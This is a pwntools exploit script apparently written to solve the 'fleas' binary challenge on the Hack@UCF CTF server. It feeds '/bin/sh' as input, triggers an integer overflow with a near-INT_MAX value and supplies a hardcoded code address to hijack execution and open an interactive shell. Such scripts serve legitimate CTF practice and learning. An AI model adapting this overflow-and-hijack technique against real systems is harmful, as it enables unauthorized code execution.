#!/bin/python3
from pwn import *
import sys

binary = "./fleas"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
#context.log_level  = 'debug'
#libc = elf.libc
#rop = ROP(elf)

#### GDB Script
script = '''
'''


io = None
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
rr = lambda *a, **k: io.recvregex(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
st = lambda *a, **k: io.sendthen(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
slt = lambda *a, **k: io.sendlinethen(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)

def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = ["ctf.hackucf.org", 7004]
    if args:
        arguments = [elf.path]
        arguments.extend(args)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)


def main():
    global io
    #################### 
    ### EXPLOIT CODE ###
    ####################
    
    io = start()
    sla(b"first dog's name?\n", b"/bin/sh")
    sla(b"second dog's name?\n", b'/bin/sh')

    # interger overflow = -1
    #int_overflow = 4294967295 + 10
    #flea_location
    int_overflow =  2147483647 - 1 #+ 2
    sla(b"Tail\n", str(int_overflow))
    
    #flea_count
    dog3_speak = elf.sym["dog3_speak"]
    digiit = 0x08049411
    sa(b"have there?\n", str(int(digiit)))
    ia()



if __name__ == "__main__":
    main()

